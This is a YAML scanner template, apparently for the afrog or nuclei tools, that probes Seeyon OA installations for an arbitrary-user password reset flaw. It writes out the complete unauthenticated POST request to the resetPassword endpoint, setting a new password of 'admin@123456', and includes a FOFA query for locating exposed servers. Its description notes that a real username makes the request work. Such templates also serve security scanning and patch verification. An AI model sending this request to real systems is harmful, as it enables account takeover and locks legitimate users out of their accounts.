id: seeyon-oa-resetpassword-anyuser

info:
  name: 致远OA resetPassword任意用户密码修改漏洞
  author: zan8in
  severity: high
  description: |-
    致远OA resetPassword任意用户密码修改漏洞，注意：参数 loginName 需要真实存在的用户名
    Seeyon OA=V5/G6
    Seeyon OA=V8.1SP2
    Seeyon OA=V8.2
    FOFA: app="致远互联-OA"
  tags: 致远互联-OA

http:
  - raw:
      - |
        POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"loginName":"afrogtest","password":"admin@123456"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - '"code" : 500'
          - '"success" : false'
          - '"message" : null'
        condition: and
        part: body